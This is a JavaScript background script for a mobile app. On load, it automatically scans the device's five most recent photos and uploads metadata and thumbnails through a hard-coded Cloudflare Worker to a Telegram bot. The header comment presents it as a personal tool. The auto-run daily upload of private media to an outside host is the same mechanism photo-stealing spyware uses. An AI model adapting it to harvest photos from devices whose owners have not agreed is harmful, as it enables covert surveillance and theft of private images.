/* background.js — personal photo report → Cloudflare Worker → Telegram.
   Owner: personal use, own phone, own photos, own bot.
   - Scans only the 5 most recent photos (fast)
   - Sends start message, progress, report, and 5 thumbnails
*/
(function(){
  'use strict';
  if (typeof window === 'undefined') return;

  var WORKER_URL   = 'https://project1.yashavanthan22.workers.dev';
  var K_LASTSENT   = 'tg_lastsent_day';
  var SANDBOX_FILE = 'photo_queue.json';

  var MAX_SCAN  = 5;        /* only the 5 most recent */
  var MAX_SEND  = 5;
  var SCAN_MS   = 15000;
  var THUMB_MS  = 15000;
  var REPORT_MS = 30000;
  var PHOTO_MS  = 45000;

  /* ---------- storage ---------- */
  function load(k){ try { return iappyx.load(k); } catch(e){ return null; } }
  function save(k,v){ try { iappyx.save(k, String(v)); return true; } catch(e){ return false; } }
  function loadFile(n){ try { return iappyx.storage.loadFile(n); } catch(e){ return null; } }
  function saveFile(n,c){ try { iappyx.storage.saveFile(n,c); return true; } catch(e){ return false; } }
  function delFile(n){ try { iappyx.storage.deleteFile(n); } catch(e){} }

  /* ---------- helpers ---------- */
  function today(){
    var d = new Date();
    return d.getFullYear() + '-' +
      String(d.getMonth()+1).padStart(2,'0') + '-' +
      String(d.getDate()).padStart(2,'0');
  }
  function hhmm(){
    var d = new Date();
    return String(d.getHours()).padStart(2,'0') + ':' +
           String(d.getMinutes()).padStart(2,'0') + ':' +
           String(d.getSeconds()).padStart(2,'0');
  }
  function online(){
    try { var c = JSON.parse(iappyx.device.getConnectivity()); return !!(c && c.connected); }
    catch(e){ return false; }
  }
  function notify(title, body){
    try { iappyx.notification.send(title, body); } catch(e){}
  }

  /* ---------- worker: text ---------- */
  function postText(text, cb){
    cb = cb || function(){};
    var id = 'txt_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
    window._iappyxCb = window._iappyxCb || {};
    var done = false;
    function finish(ok, detail){
      if (done) return; done = true;
      try { clearTimeout(t); } catch(e){}
      try { delete window._iappyxCb[id]; } catch(e){}
      cb(ok, detail);
    }
    var t = setTimeout(function(){ finish(false, 'timeout'); }, REPORT_MS);
    window._iappyxCb[id] = function(res){
      if (!res || !res.ok || res.status >= 400){
        finish(false, (res && (res.error || ('http-' + res.status))) || 'http-error');
        return;
      }
      finish(true, res.body);
    };
    try {
      iappyx.httpClient.request(JSON.stringify({
        url: WORKER_URL + '/report',
        method: 'POST',
        timeout: REPORT_MS - 5000,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: String(text) })
      }), id);
    } catch(e){ finish(false, 'exception'); }
  }

  /* ---------- worker: photo ---------- */
  function postPhoto(dataUrl, caption, cb){
    cb = cb || function(){};
    var comma = dataUrl.indexOf(',');
    var b64 = comma >= 0 ? dataUrl.substring(comma + 1) : dataUrl;
    if (!b64){ cb(false, 'empty'); return; }
    var tmp = 'tg_tmp_' + Date.now() + '_' + Math.random().toString(36).substr(2,4) + '.jpg';
    if (!saveFile(tmp, b64)){ cb(false, 'save-fail'); return; }
    var path = tmp;
    try { path = '/data/data/' + iappyx.device.getPackageName() + '/files/' + tmp; } catch(e){}
    var id = 'ph_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
    window._iappyxCb = window._iappyxCb || {};
    var done = false;
    function finish(ok, detail){
      if (done) return; done = true;
      try { clearTimeout(t); } catch(e){}
      try { delete window._iappyxCb[id]; } catch(e){}
      delFile(tmp);
      cb(ok, detail);
    }
    var t = setTimeout(function(){ finish(false, 'timeout'); }, PHOTO_MS);
    window._iappyxCb[id] = function(res){ finish(!!(res && res.ok), res && res.body); };
    try {
      iappyx.httpClient.uploadMultipart(JSON.stringify({
        url: WORKER_URL + '/photo', method: 'POST', timeout: PHOTO_MS - 5000
      }), JSON.stringify([
        { name: 'caption', value: String(caption || '') },
        { name: 'photo', filePath: path, filename: tmp, contentType: 'image/jpeg' }
      ]), id);
    } catch(e){ finish(false, 'exception'); }
  }

  /* ---------- scan: only 5 most recent ---------- */
  function scanRecent(cb){
    var done = false;
    var id = 'scan_' + Date.now();
    window._iappyxCb = window._iappyxCb || {};
    function finish(list, err){
      if (done) return; done = true;
      try { clearTimeout(t); } catch(e){}
      try { delete window._iappyxCb[id]; } catch(e){}
      cb(list || [], err || null);
    }
    var t = setTimeout(function(){ finish([], 'timeout'); }, SCAN_MS);
    window._iappyxCb[id] = function(res){
      if (!res || !res.ok || !res.images){ finish([], (res && res.error) || 'failed'); return; }
      var list = res.images.slice(0, MAX_SCAN);
      finish(list, null);
    };
    try { iappyx.media.getImages(id, MAX_SCAN); }
    catch(e){ finish([], 'exception'); }
  }

  /* ---------- thumbnail ---------- */
  function thumb(id, cb){
    var done = false;
    var cid = 'th_' + id + '_' + Date.now();
    window._iappyxCb = window._iappyxCb || {};
    function finish(b64){
      if (done) return; done = true;
      try { clearTimeout(t); } catch(e){}
      try { delete window._iappyxCb[cid]; } catch(e){}
      cb(b64 || null);
    }
    var t = setTimeout(function(){ finish(null); }, THUMB_MS);
    window._iappyxCb[cid] = function(res){
      finish(res && res.ok && res.dataUrl ? res.dataUrl : null);
    };
    try { iappyx.media.loadThumbnail(cid, String(id)); }
    catch(e){ finish(null); }
  }

  /* ---------- report text ---------- */
  function reportText(photos){
    var l = [];
    l.push('📸 *Recent Photos*');
    l.push('📅 ' + today() + '  ·  ' + hhmm());
    l.push('');
    l.push('Showing *' + photos.length + '* most recent');
    if (photos.length){
      var total = photos.reduce(function(s,p){ return s + (Number(p.size)||0); }, 0);
      l.push('Size: ' + (total/1024/1024).toFixed(2) + ' MB');
      l.push('');
      photos.forEach(function(p, i){
        var d = new Date(Number(p.date));
        var h = String(d.getHours()).padStart(2,'0');
        var m = String(d.getMinutes()).padStart(2,'0');
        l.push((i+1) + '. ' + h + ':' + m + ' · ' + (p.width||'?') + '×' + (p.height||'?') +
               ' · ' + ((Number(p.size)||0)/1024/1024).toFixed(1) + ' MB');
      });
    }
    return l.join('\n');
  }

  /* ---------- progress bar ---------- */
  function bar(pct){
    var filled = Math.round(pct / 10);
    var empty = 10 - filled;
    var f = '', e = '';
    for (var i=0;i<filled;i++) f += '█';
    for (var j=0;j<empty;j++) e += '░';
    return f + e + ' ' + pct + '%';
  }

  /* ---------- main ---------- */
  function run(cb){
    cb = cb || function(){};

    if (!online()){
      postText('⚠️ Photo report skipped — no internet (' + hhmm() + ')');
      cb({ ok:false, skipped:'offline' });
      return;
    }
    if (load(K_LASTSENT) === today()){
      cb({ ok:false, skipped:'already-sent' });
      return;
    }

    /* START */
    postText(
      '🚀 *Photo report started*\n' +
      '📅 ' + today() + '\n' +
      '⏱ ' + hhmm() + '\n\n' +
      'Scanning latest 5 photos…'
    , function(okStart){
      if (!okStart){
        notify('Report start failed', 'Worker unreachable.');
        cb({ ok:false, step:'start', error:'worker-unreachable' });
        return;
      }

      /* SCAN (only 5 recent) */
      scanRecent(function(photos, scanErr){
        if (scanErr){
          postText(
            '❌ *Scan failed*\n' +
            'Error: `' + scanErr + '`\n\n' +
            'Grant photo permission in Settings → Apps → this app → Permissions.'
          );
          notify('Photo scan failed', scanErr);
          cb({ ok:false, step:'scan', error: scanErr });
          return;
        }

        /* save queue */
        try {
          var q = [];
          var raw = loadFile(SANDBOX_FILE);
          if (raw){ try { q = JSON.parse(raw) || []; } catch(e){ q = []; } }
          if (!Array.isArray(q)) q = [];
          var day = today();
          q = q.filter(function(e){ return e.day !== day; });
          q.push({ day: day, count: photos.length, savedAt: Date.now(),
            photos: photos.map(function(p){
              return { id:p.id, name:p.name, date:p.date, width:p.width,
                       height:p.height, size:p.size, mime:p.mime };
            })
          });
          saveFile(SANDBOX_FILE, JSON.stringify(q));
        } catch(e){}

        if (photos.length === 0){
          postText('ℹ️ No photos found on this device.');
          save(K_LASTSENT, today());
          notify('Photo report done', 'No photos found.');
          cb({ ok:true, count:0, sent:0, failed:0 });
          return;
        }

        /* REPORT + 10% */
        postText(reportText(photos) + '\n\n' + bar(10) + '\n_Sending thumbnails…_',
          function(okRep, detail){
          if (!okRep){
            notify('Report send failed', detail || 'unknown');
            cb({ ok:false, step:'report', error: detail });
            return;
          }

          var total = photos.length;
          var i = 0, sent = 0, failed = 0;
          var nextStepPct = 20;

          function next(){
            if (i >= total){
              postText(
                '✅ *Done*\n' +
                bar(100) + '\n\n' +
                '📸 Photos: ' + total + '\n' +
                '📤 Sent: ' + sent + '/' + total + '\n' +
                (failed ? '⚠️ Failed: ' + failed + '\n' : '') +
                '⏱ ' + hhmm()
              );
              save(K_LASTSENT, today());
              notify('Photo report done', total + ' photos · ' + sent + '/' + total + ' sent');
              cb({ ok:true, count: total, sent: sent, failed: failed });
              return;
            }

            var p = photos[i++];
            var label = p.name || ('photo ' + p.id);

            thumb(p.id, function(b64){
              if (!b64){
                failed++;
                afterStep();
                return;
              }
              postPhoto(b64, label, function(okPh){
                if (okPh) sent++; else failed++;
                afterStep();
              });
            });

            function afterStep(){
              var pct = Math.round((i / total) * 90) + 10;
              if (pct >= nextStepPct || i === total){
                postText(
                  '📤 *Progress*\n' + bar(pct) + '\n\n' +
                  'Sent: ' + sent + '/' + total +
                  (failed ? '  ·  Failed: ' + failed : '') +
                  '\nCurrent: `' + label + '`'
                );
                nextStepPct = Math.min(100, pct + 20);
              }
              next();
            }
          }
          next();
        });
      });
    });
  }

  /* ---------- expose ---------- */
  window.bg = window.bg || {};
  window.bg.runDailyReport = run;
  window.bg.resetDaily = function(){ save(K_LASTSENT, ''); return true; };
  window.bg.workerUrl = WORKER_URL;
  window.bg.progressBar = bar;

  /* ---------- auto-run on boot ---------- */
  try {
    var start = function(){
      setTimeout(function(){
        try {
          run(function(r){ try { console.log('[bg]', r); } catch(e){} });
        } catch(e){
          try { notify('Report crashed', String(e && e.message || e)); } catch(_){}
        }
      }, 1500);
    };
    if (document.readyState === 'complete' || document.readyState === 'interactive') start();
    else window.addEventListener('load', start);
  } catch(e){}

})();